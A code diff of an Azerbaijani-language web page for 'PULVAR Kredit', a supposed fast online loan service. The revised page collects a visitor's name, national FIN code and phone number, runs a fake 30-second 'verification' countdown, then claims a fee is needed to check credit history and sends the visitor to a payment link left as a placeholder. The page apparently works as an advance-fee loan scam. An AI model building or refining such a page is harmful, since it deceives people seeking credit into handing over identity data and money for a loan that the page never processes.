@@ -4,218 +4,167 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>PULVAR Kredit</title>
+
 <style>
-*{box-sizing:border-box}
 body{
   margin:0;
-  font-family:Arial, sans-serif;
-  background:#b80000;
+  font-family:Arial;
+  background:#c40000;
   color:#fff;
 }
 .container{
-  max-width:430px;
+  max-width:420px;
   margin:auto;
-  min-height:100vh;
-  padding:22px;
-}
-.lang{
-  display:flex;
-  justify-content:flex-end;
-  gap:8px;
-}
-.lang button{
-  border:1px solid #fff;
-  background:transparent;
-  color:#fff;
-  padding:7px 12px;
-  border-radius:20px;
-  font-weight:700;
+  padding:20px;
 }
 .logo{
   text-align:center;
-  font-size:34px;
+  font-size:32px;
   font-weight:900;
-  margin:18px 0 4px;
 }
-.subtitle{text-align:center;font-size:15px;font-weight:700}
+.subtitle{
+  text-align:center;
+  margin-bottom:20px;
+}
 .card{
-  margin-top:25px;
-  background:#d60000;
-  border-radius:28px;
-  padding:25px;
-  box-shadow:0 15px 35px rgba(0,0,0,.35);
+  background:#e10000;
+  padding:20px;
+  border-radius:25px;
 }
 .top{
   display:flex;
   justify-content:space-between;
-  font-size:24px;
-  font-weight:800;
+  font-size:22px;
+  font-weight:900;
 }
 input[type=range]{
   width:100%;
-  margin:30px 0;
-  accent-color:#36e0c0;
+  margin:25px 0;
 }
 .row{
   display:flex;
   justify-content:space-between;
-  border-top:2px solid rgba(255,255,255,.8);
-  padding:16px 0;
-  font-size:20px;
+  padding:12px 0;
+  border-top:2px solid #fff;
   font-weight:800;
 }
 .info{
   margin-top:15px;
   font-size:15px;
-  line-height:1.6;
-  font-weight:700;
 }
 .btn{
   width:100%;
+  margin-top:20px;
+  padding:18px;
   border:none;
-  margin-top:24px;
-  padding:20px;
-  border-radius:28px;
-  font-size:24px;
+  border-radius:30px;
+  font-size:22px;
   font-weight:900;
+  background:linear-gradient(90deg,#d9ff00,#3fd6c4);
   color:#000;
-  background:linear-gradient(90deg,#d9ff00,#31d9c4);
 }
 .section{
   display:none;
-  margin-top:22px;
   background:#fff;
-  color:#111;
-  border-radius:24px;
-  padding:22px;
-}
-.section h2{
-  margin-top:0;
-  color:#b80000;
+  color:#000;
+  padding:20px;
+  border-radius:20px;
+  margin-top:20px;
 }
 input{
   width:100%;
-  padding:15px;
+  padding:12px;
   margin:8px 0;
-  border-radius:14px;
-  border:2px solid #ddd;
-  font-size:16px;
-  font-weight:700;
+  border-radius:10px;
+  border:1px solid #ccc;
 }
 .error{
-  color:#b80000;
-  font-weight:800;
-  margin-top:8px;
+  color:red;
+  font-weight:700;
 }
 .wait{
-  display:none;
   text-align:center;
-  font-size:22px;
+  font-size:20px;
   font-weight:900;
-  color:#b80000;
 }
-.success{
-  display:none;
-  font-size:17px;
-  line-height:1.6;
-  font-weight:700;
-}
-.footer{
-  margin-top:25px;
+.payBox{
   text-align:center;
-  font-size:13px;
-  font-weight:700;
 }
-.footer a{color:#fff}
-.master{
-  margin-top:10px;
-  font-size:22px;
-  letter-spacing:2px;
-}
-.small{
-  font-size:12px;
-  opacity:.9;
-  line-height:1.5;
+.payBtn{
+  margin-top:15px;
+  padding:15px 25px;
+  border:none;
+  border-radius:12px;
+  background:green;
+  color:#fff;
+  font-size:18px;
+  font-weight:900;
 }
 </style>
 </head>
+
 <body>
 
 <div class="container">
 
-  <div class="lang">
-    <button onclick="setLang('az')">AZ</button>
-    <button onclick="setLang('ru')">RU</button>
-  </div>
+<div class="logo">PULVAR Kredit</div>
+<div class="subtitle">Sürətli kredit müraciəti</div>
 
-  <div class="logo">PULVAR Kredit</div>
-  <div class="subtitle" id="sub">Sürətli kredit müraciəti</div>
+<div class="card">
 
-  <div class="card">
-    <div class="top">
-      <span id="choose">Məbləği seçin</span>
-      <span><b id="amountText">500</b> ₼</span>
-    </div>
+<div class="top">
+<span>Məbləği seçin</span>
+<span><b id="amountText">20</b> ₼</span>
+</div>
 
-    <input type="range" min="20" max="500" step="10" value="500" id="amount">
+<input type="range" id="amount" min="20" max="220" step="10" value="20">
 
-    <div class="row">
-      <span id="loanAmount">Kreditin məbləği</span>
-      <span><b id="amountResult">500</b> ₼</span>
-    </div>
+<div class="row">
+<span>Kreditin məbləği</span>
+<span><b id="amountResult">20</b> ₼</span>
+</div>
 
-    <div class="row">
-      <span id="loanTime">Kreditin müddəti</span>
-      <span>45 gün</span>
-    </div>
+<div class="row">
+<span>Kreditin müddəti</span>
+<span>45 gün</span>
+</div>
 
-    <div class="row">
-      <span id="payDateText">Ödəniş tarixi</span>
-      <span id="payDate"></span>
-    </div>
+<div class="row">
+<span>Ödəniş tarixi</span>
+<span id="date"></span>
+</div>
 
-    <div class="info" id="tableInfo">
-      15-ci gün üçün: 75 ₼ xidmət haqqı<br>
-      25-ci gün üçün: 100 ₼ xidmət haqqı<br>
-      35-ci gün üçün: 125 ₼ xidmət haqqı<br>
-      45-ci gün üçün: 150 ₼ xidmət haqqı
-    </div>
+<div class="info" id="tableInfo"></div>
 
-    <button class="btn" onclick="openForm()" id="getBtn">Vəsait əldə etmək</button>
-  </div>
+<button class="btn" onclick="openForm()">Vəsait əldə etmək</button>
 
-  <div class="section" id="formBox">
-    <h2 id="formTitle">Müraciət formu</h2>
+</div>
 
-    <input id="fullname" placeholder="Ad Soyad">
-    <input id="fin" placeholder="FIN kod">
-    <input id="phone" placeholder="Mobil nömrə">
+<!-- FORM -->
+<div class="section" id="formBox">
+<h3>Məlumatları daxil et</h3>
+<input id="name" placeholder="Ad Soyad">
+<input id="fin" placeholder="FIN kod">
+<input id="phone" placeholder="Nömrə">
+<button class="btn" onclick="checkForm()">Davam et</button>
+<div class="error" id="error"></div>
+</div>
 
-    <button class="btn" onclick="submitForm()" id="continueBtn">Davam et</button>
-    <div class="error" id="error"></div>
-  </div>
+<!-- WAIT -->
+<div class="section wait" id="waitBox">
+<p>Yoxlanılır...</p>
+<p><span id="count">30</span> saniyə gözləyin</p>
+</div>
 
-  <div class="section wait" id="waitBox">
-    <p id="waitText">Məlumatlar yoxlanılır...</p>
-    <p><span id="count">30</span> saniyə gözləyin</p>
-  </div>
+<!-- PAYMENT -->
+<div class="section payBox" id="payBox">
+<h3>Hörmətli müştəri!</h3>
+<p id="payText"></p>
 
-  <div class="section success" id="successBox">
-    <h2 id="dear">Hörmətli müştəri!</h2>
-    <p id="finalText"></p>
-    <button class="btn" onclick="location.href='http://T.me/Pulvar.Xyz'" id="contactBtn">
-      Bizimlə əlaqə
-    </button>
-  </div>
-
-  <div class="footer">
-    <div>PULVAR.XYZ</div>
-    <div class="master">💳 MASTERCARD</div>
-    <p class="small" id="license">
-      PULVAR Kredit onlayn müraciət platformasıdır. Saytda göstərilən məlumatlar ilkin müraciət və məlumatlandırma məqsədi daşıyır.
-    </p>
-    <a href="http://T.me/Pulvar.Xyz">Telegram: @Pulvar.Xyz</a>
-  </div>
+<button class="payBtn" onclick="payNow()">
+Ödəniş et
+</button>
+</div>
 
 </div>
 
@@ -223,47 +172,62 @@ input{
 const amount = document.getElementById("amount");
 const amountText = document.getElementById("amountText");
 const amountResult = document.getElementById("amountResult");
+const tableInfo = document.getElementById("tableInfo");
 
-amount.oninput = () => {
-  amountText.textContent = amount.value;
-  amountResult.textContent = amount.value;
-};
+function calc(){
+  let val = parseInt(amount.value);
 
-function setPayDate(){
-  const d = new Date();
-  d.setDate(d.getDate()+45);
-  const day = String(d.getDate()).padStart(2,"0");
-  const month = String(d.getMonth()+1).padStart(2,"0");
-  const year = d.getFullYear();
-  document.getElementById("payDate").textContent = `${day}.${month}.${year}`;
+  amountText.innerText = val;
+  amountResult.innerText = val;
+
+  let f15 = Math.round(val * 0.15);
+  let f25 = Math.round(val * 0.20);
+  let f35 = Math.round(val * 0.25);
+  let f45 = Math.round(val * 0.30);
+
+  tableInfo.innerHTML = `
+  15 gün: ${f15} ₼ (Ümumi: ${val+f15} ₼)<br>
+  25 gün: ${f25} ₼ (Ümumi: ${val+f25} ₼)<br>
+  35 gün: ${f35} ₼ (Ümumi: ${val+f35} ₼)<br>
+  45 gün: ${f45} ₼ (Ümumi: ${val+f45} ₼)
+  `;
 }
-setPayDate();
 
+amount.oninput = calc;
+calc();
+
+// tarix
+let d = new Date();
+d.setDate(d.getDate()+45);
+document.getElementById("date").innerText =
+d.toLocaleDateString("az-AZ");
+
+// FORM
 function openForm(){
   document.getElementById("formBox").style.display="block";
-  document.getElementById("formBox").scrollIntoView({behavior:"smooth"});
 }
 
-function submitForm(){
-  const name = document.getElementById("fullname").value.trim();
-  const fin = document.getElementById("fin").value.trim().toUpperCase();
-  const phone = document.getElementById("phone").value.trim();
-  const error = document.getElementById("error");
+// CHECK
+function checkForm(){
+  let name = document.getElementById("name").value.trim();
+  let fin = document.getElementById("fin").value.trim();
+  let phone = document.getElementById("phone").value.trim();
+  let error = document.getElementById("error");
 
-  error.textContent = "";
+  error.innerText="";
 
   if(name.length < 5 || !name.includes(" ")){
-    error.textContent = "Ad və soyadı düzgün yazın.";
+    error.innerText="Ad soyadı düzgün yaz!";
     return;
   }
 
-  if(fin.length < 6 || fin.length > 8){
-    error.textContent = "FIN kod düzgün deyil.";
+  if(fin.length < 6){
+    error.innerText="FIN səhvdir!";
     return;
   }
 
   if(phone.length < 9){
-    error.textContent = "Mobil nömrəni düzgün yazın.";
+    error.innerText="Nömrə səhvdir!";
     return;
   }
 
@@ -271,47 +235,28 @@ function submitForm(){
   document.getElementById("waitBox").style.display="block";
 
   let sec = 30;
-  document.getElementById("count").textContent = sec;
+  let count = document.getElementById("count");
 
-  const timer = setInterval(()=>{
+  let timer = setInterval(()=>{
     sec--;
-    document.getElementById("count").textContent = sec;
+    count.innerText = sec;
 
-    if(sec <= 0){
+    if(sec == 0){
       clearInterval(timer);
+
       document.getElementById("waitBox").style.display="none";
-      document.getElementById("successBox").style.display="block";
+      document.getElementById("payBox").style.display="block";
 
-      document.getElementById("finalText").innerHTML =
-        "<b>" + name + "</b>, müraciətiniz qəbul edildi.<br><br>" +
-        "Məlumatlarınız ilkin yoxlanışa göndərildi. Operator qısa zamanda sizinlə əlaqə saxlayacaq.<br><br>" +
-        "Daha sürətli cavab üçün aşağıdakı düyməyə basaraq Telegram dəstək xidmətinə yazın.";
-
-      document.getElementById("successBox").scrollIntoView({behavior:"smooth"});
+      document.getElementById("payText").innerHTML =
+      name + ", kredit tarixçənizin yoxlanılması üçün ödəniş tələb olunur.";
     }
+
   },1000);
 }
 
-function setLang(lang){
-  if(lang === "az"){
-    location.reload();
-  } else {
-    document.getElementById("sub").textContent="Быстрая заявка на кредит";
-    document.getElementById("choose").textContent="Выберите сумму";
-    document.getElementById("loanAmount").textContent="Сумма кредита";
-    document.getElementById("loanTime").textContent="Срок кредита";
-    document.getElementById("payDateText").textContent="Дата оплаты";
-    document.getElementById("getBtn").textContent="Получить средства";
-    document.getElementById("formTitle").textContent="Форма заявки";
-    document.getElementById("fullname").placeholder="Имя Фамилия";
-    document.getElementById("fin").placeholder="FIN код";
-    document.getElementById("phone").placeholder="Мобильный номер";
-    document.getElementById("continueBtn").textContent="Продолжить";
-    document.getElementById("waitText").textContent="Данные проверяются...";
-    document.getElementById("dear").textContent="Уважаемый клиент!";
-    document.getElementById("contactBtn").textContent="Связаться с нами";
-    document.getElementById("license").textContent="PULVAR Kredit — онлайн платформа для первичной заявки и информирования.";
-  }
+// PAYMENT
+function payNow(){
+  window.location.href = "https://epoint.az/pay/SENIN_LINK";
 }
 </script>
 
